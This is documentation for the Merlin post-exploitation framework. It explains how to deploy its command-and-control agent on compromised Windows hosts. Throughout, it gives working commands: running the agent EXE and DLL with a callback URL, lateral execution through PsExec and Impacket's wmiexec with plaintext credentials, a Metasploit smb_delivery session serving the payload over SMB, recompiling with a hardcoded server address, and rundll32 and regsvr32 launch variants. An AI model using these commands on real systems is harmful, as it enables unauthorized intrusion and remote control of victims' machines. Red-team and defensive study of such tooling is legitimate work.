.. _agent_quickstart:

============
Merlin Agent
============

Merlin is a post-exploitation framework and therefore documentation doesn't cover any of the steps required to get to a point where you can execute code or commands on a compromised host. Exploiting or accessing a host must performed prior to leveraging Merlin.

| **Pre-compiled Merlin Agent binary files are distributed with the server download in the** ``data/bin/`` **directory of Merlin**

The Merlin Agent source code can be found https://github.com/Ne0nd0g/merlin-agent

Retrieve with Go and build the Agent::

    go get github.com/Ne0nd0g/merlin-agent

----------------
Upload & Execute
----------------

One of the more simple ways to run Merlin is by uploading the compiled binary file to a compromised host and then execute that binary.

| Don't forget to specify the address of your Merlin server with the ``-url`` flag. Default is `https://127.0.0.1:443/`

-------------------------------
Windows Local Command Execution
-------------------------------

This section covers executing the Merlin agent with local command execution.

Windows EXE - cmd.exe
^^^^^^^^^^^^^^^^^^^^^

With the `merlinAgent.exe` binary file already downloaded on to the compromised host, execute it by calling it from the command line. Double clicking the executable file will cause the agent to run **without** a window, so you will not see anything, and it will connect to the **default** URL of `https://127.0.0.1:443/`. This can be changed by recompiling the agent with the hardcoded address of your Merlin server.

cmd.exe example::

    C:\Users\Bob\Downloads>merlinAgent.exe -url https://192.168.1.100:443/

Windows DLL - rundll32.exe
^^^^^^^^^^^^^^^^^^^^^^^^^^

With the `merlin.dll` binary file already downloaded on to the compromised host, execute it by calling it from the command line using the `rundll32.exe` program that comes with Windows. `Run` is the name of the DLL entrypoint called when the DLL is executed. Provide the URL for your listening Merlin server after the entrypoint.

rundll32.exe example::

    C:\Users\Bob\Downloads>C:\WINDOWS\System32\rundll32.exe merlin.dll,Run https://192.168.1.100:443/

--------------------------------
Windows Remote Command Execution
--------------------------------

This section covers executing Merlin agent when remotely accessing a host.

Windows EXE - PsExec.exe
^^^^^^^^^^^^^^^^^^^^^^^^

The Microsoft Sysinternals `PsExec.exe <https://docs.microsoft.com/en-us/sysinternals/downloads/psexec>`_ application can be used to connect to a remote host, upload the Merlin agent file, and execute it. The downside to this is the Merlin agent binary file is "on disk" and provides an opportunity for Anti-Virus software to detect the application. Use PsExec's `-c` flag to specify the location of the Merlin agent file on the attacker's host that will be uploaded to the remote host. The PsExec `-d` flag is required so that control is returned to the user after executing the Merlin agent file.

PsExec.exe example::

    PS C:\SysinternalsSuite>.\PsExec.exe \\192.168.1.10 -u bob -p password -d -c C:\merlin\data\bin\windows\merlinAgent.exe -url https://192.168.1.100:443/

Windows DLL - Metasploit's SMB Delivery
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

One method for delivery is to use an SMB server to host the payload and execute a command on the remote host to download and run the Merlin agent file. The Metasploit `windows/smb/smb_delivery` module is a good way to quickly stand up an SMB server for delivering the payload.

Setup the ``windows/smb/smb_delivery`` module::

    msf > use windows/smb/smb_delivery
    msf exploit(windows/smb/smb_delivery) > set FILE_NAME merlin.dll
    FILE_NAME => merlin.dll
    msf exploit(windows/smb/smb_delivery) > set EXE::Custom /opt/merlin.dll
    EXE::Custom => /opt/merlin/data/bin/dll/merlin.dll
    msf exploit(windows/smb/smb_delivery) > set DisablePayloadHandler true
    DisablePayloadHandler => true
    msf exploit(windows/smb/smb_delivery) > set VERBOSE true
    VERBOSE => true
    msf exploit(windows/smb/smb_delivery) > run
    [*] Exploit running as background job 0.
    msf exploit(windows/smb/smb_delivery) >
    [*] Server started.
    [*] Run the following command on the target machine:
    [*] Using custom payload /opt/merlin.dll, RHOST and RPORT settings will be ignored!
    rundll32.exe \\192.168.1.100\WxlV\merlin.dll,0


| **NOTE:** We must change the DLL entry point from `0` to `Run` and provide the URL of the listening Merlin server

Now that the SMB server is setup to deliver the `merlin.dll` file, we need to remotely access the target host and execute the command. By default, Metasploit sets the entry point to `0`. We need to modify the command to change the entry point to `Run` and specify the location of our listening Merlin server. `Impacket's <https://github.com/CoreSecurity/impacket>`_ `wmiexec.py` Python program is one way to remotely access a host.

wmiexec.py example:

| **NOTE:** We must change the DLL entry point from `0` to `Run` and provide the URL of the listening Merlin server

::

    root@kali:/opt/impacket/examples# python wmiexec.py bob:password@192.168.1.10
    Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

    [*] SMBv2.1 dialect used
    [!] Launching semi-interactive shell - Careful what you execute
    [!] Press help for extra shell commands
    C:\>rundll32.exe \\192.168.1.100\WxlV\merlin.dll,Run https://192.168.1.100:443/

Advanced
--------

The quick start examples above executed the Merlin agent and allowed the user to dynamically specify the location of the listening Merlin server with a command line parameter. There are a few instances where we the user is unable to specify, or simply don't want to, the URL for the listening Merlin server. In this case, the Merlin agent binary should be recompiled with a hardcoded URL of the listening Merlin server so that it does not need to be specified by the user during execution. *Do not continue on unless you are OK to deal with things that sometimes work and often have bugs and are not reliable.*

| This will require that you have Go and gcc installed on the host compiling the application

Recompile DLL
^^^^^^^^^^^^^

The `merlin.dll` file can be configured with the hardcoded url of your Merlin server. To do this, clone the repo, modify the file, and recompile it.

1. Clone the merlin repository using git
2. Edit the `main.go` file
3. Find the string `var url = "https://127.0.0.1:443/"` and change the address
4. Compile the DLL

example::

    cd /opt
    git clone -b dev https://github.com/Ne0nd0g/merlin-agent-dll.git
    cd merlin-agent-dll
    sed -i 's_https://127.0.0.1:443/_https://192.168.1.100:443/_' main.go
    make

This will leave the `merlin.dll` in the `bin/v0.5.0/` directory where `v0.5.0` is the current version number of Merlin. Now the recompiled version of the DLL can be run without having to specify the address of the Merlin server.

rundll32.exe examples:

* ``rundll32.exe merlin,main``

* ``rundll32.exe merlin,Run``

regsvr32.exe examples:

* ``regsvr32.exe /s merlin.dll``

* ``regsvr32.exe /s /u merlin.dll``

* ``regsvr32.exe /s /n /i merlin.dll``
